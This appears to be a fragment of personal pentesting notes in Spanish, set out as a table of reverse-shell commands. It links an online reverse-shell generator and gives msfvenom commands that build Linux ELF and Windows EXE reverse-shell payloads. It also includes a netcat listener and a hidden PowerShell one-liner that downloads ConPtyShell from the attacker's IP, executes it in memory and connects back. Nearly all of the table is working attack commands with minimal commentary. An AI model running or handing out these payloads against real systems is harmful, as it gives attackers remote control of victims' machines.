...
| **Acción**                                                                                                                                                                                                                                                                                                                                                                                     | **Descripción**                                  |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------ |
| <br>https://www.revshells.com/<br><br>                                                                                                                                                                                                                                                                                                                                                         | <br>Generador online de reverse shells.          |
| <br>`msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ip> -f elf -o shell LPORT=<port>`<br><br>                                                                                                                                                                                                                                                                                            | <br>Para Linux como ejecutable ELF.<br><br>      |
| <br>`msfvenom -p windows/x64/shell/reverse_tcp LHOST=<ip> LPORT=<port> -f exe > shell.exe`<br><br>                                                                                                                                                                                                                                                                                             | <br>Para Windows como ejecutable `.exe`.<br><br> |
| <br>*En la máquina atacante:*<br>[Descargar ConPtyShell.ps1](https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1)<br>`stty raw -echo; (stty size; cat) \| nc -lvnp <port>`<br><br>*En la máquina de destino:*<br>`powershell.exe -WindowStyle Hidden IEX(IWR http://<ip>/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell <ip> <port>`<br><br> | <br><br><br>ConPtyShell #porhacer                |
